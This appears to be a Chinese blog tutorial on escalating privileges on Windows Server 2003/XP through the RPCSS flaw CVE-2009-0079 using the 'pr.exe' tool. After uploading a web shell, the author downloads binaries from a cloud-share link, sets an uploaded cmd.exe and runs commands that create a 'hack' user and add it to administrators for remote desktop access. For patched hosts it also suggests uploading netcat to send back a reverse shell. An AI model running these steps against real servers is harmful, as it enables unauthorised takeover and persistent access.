**目录**

[提权利用的漏洞](#t0)

[PR提权](#t1)

* * *

### 提权利用的漏洞

**Microsoft Windows RPCSS服务隔离本地权限提升漏洞**

RPCSS服务没有正确地隔离 NetworkService 或 LocalService 帐号下运行的进程，本地攻击者可以利用令牌劫持的方式获得权限提升。成功利用此漏洞的攻击者可以完全控制受影响的系统，攻击者可随后安装程序；查看、更改或删除数据；或者创建拥有完全[用户权限](https://so.csdn.net/so/search?q=%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90&spm=1001.2101.3001.7020)的新帐户。

BUGTRAQ  ID: 34443   
CVE(CAN) ID: CVE-2009-0079

发布日期：2009-04-14   
更新日期：2009-04-24

受影响系统：   
Microsoft Windows XP x64 SP2   
Microsoft Windows XP x64   
Microsoft Windows XP SP3   
Microsoft Windows XP SP2   
Microsoft Windows Server 2003 SP2   
Microsoft Windows Server 2003 SP1

也就是说只有Windows Server 2003和windows xp系统能够使用 pr [提权](https://so.csdn.net/so/search?q=%E6%8F%90%E6%9D%83&spm=1001.2101.3001.7020)。

### PR提权

> 以下环境，Windows Server 2003

很多时候，当我们上传了一句话木马之后，想要进行一些操作。比如，查看当前用户的身份，这时会发现权限不够，当前的命令行只对网站当前目录下的文件具有操作权限，对其他目录和系统都没有权限，这时我们就需要提权了。

![](https://img-blog.csdnimg.cn/20181127110120754.png)

我们把下面两个程序上传到网站目录下去

程序链接：链接: [https://pan.baidu.com/s/1ibgYfY38kBLsbq72NsVEHg](https://pan.baidu.com/s/1ibgYfY38kBLsbq72NsVEHg)    提取码: unyc 

![](https://img-blog.csdnimg.cn/20181127110627265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后执行下面这条命令，把当前终端的执行程序设置成我们上传的 cmd.exe

```
setp  "C:\website\站酷爱装网V2012版\UploadFiles\cmd.exe"
```


然后我们就可以做我们想做的任何事情了。我们的命令用双引号引住，前面加上 pr.exe

```
pr.exe "net user hack 123 /add"   #新建一个hack用户，密码为 123      
pr.exe "net localgroup administrators hack /add" #将hack用户加入administrators管理员组
```


![](https://img-blog.csdnimg.cn/20181127111349720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

 接着，我们就可以用远程桌面登录了，前提是目标主机开启了3389远程端口

![](https://img-blog.csdnimg.cn/20181127111958339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**但是**，如果目标机打上了 **KB952004补丁** 的话，是没有办法使用pr进行提权的。

这时，我们可以尝试上传nc，反弹 **c:\\windows\\system32\\cmd.exe** 。

![](https://img-blog.csdnimg.cn/20181203190612483.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20181203190628552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

相关文章：[Netcat瑞士军刀的简单使用](https://blog.csdn.net/qq_36119192/article/details/84099221) 

                  [UDF提权](https://blog.csdn.net/qq_36119192/article/details/84863268)